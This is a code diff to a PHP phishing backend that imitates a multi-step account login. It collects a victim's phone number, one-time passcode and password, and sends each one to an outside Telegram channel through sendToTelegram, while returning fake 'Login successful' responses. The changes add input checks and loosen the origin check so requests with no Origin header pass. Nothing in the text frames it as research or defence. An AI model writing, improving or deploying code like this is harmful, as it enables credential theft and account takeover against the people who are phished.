@@ -11,7 +11,7 @@ header("Access-Control-Allow-Headers: Content-Type");
 $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
 $referer = $_SERVER['HTTP_REFERER'] ?? '';
 
-if ($origin !== $allowedDomain && strpos($referer, $allowedDomain) !== 0) {
+if (!empty($origin) && $origin !== $allowedDomain && strpos($referer, $allowedDomain) !== 0) {
     http_response_code(403); // Forbidden
     echo json_encode(["error" => "Access denied"]);
     exit();
@@ -52,29 +52,48 @@ function sendToTelegram($message) {
 $requestData = $_SERVER['REQUEST_METHOD'] === 'POST' ? $_POST : $_GET;
 $action = $requestData['action'] ?? '';
 
-// Handle phone submission
 if ($action === 'phone') {
     $phone = $requestData['phone'] ?? '';
+
+    if (empty($phone)) {
+        echo json_encode(["error" => "Phone number is required"]);
+        exit();
+    }
+
     sendToTelegram("*Phone:* \n`$phone`");
-    echo json_encode(["step" => "code"]);
+
+    // Respond with step transition
+    echo json_encode(["step" => "otp", "message" => "Enter OTP", "phone" => $phone]);
     exit;
 }
 
-// Handle OTP submission
 if ($action === 'otp') {
     $phone = $requestData['phone'] ?? '';
     $code = $requestData['code'] ?? '';
+
+    if (empty($phone) || empty($code)) {
+        echo json_encode(["error" => "Phone and OTP are required"]);
+        exit();
+    }
+
     sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");
-    echo json_encode(["step" => "password"]);
+
+    echo json_encode(["step" => "password", "message" => "Enter your password", "phone" => $phone]);
     exit;
 }
 
-// Handle password submission
 if ($action === 'password') {
     $phone = $requestData['phone'] ?? '';
     $password = $requestData['password'] ?? '';
+
+    if (empty($phone) || empty($password)) {
+        echo json_encode(["error" => "Phone and password are required"]);
+        exit();
+    }
+
     sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");
-    echo json_encode(["status" => "success"]);
+
+    echo json_encode(["status" => "success", "message" => "Login successful"]);
     exit;
 }
 
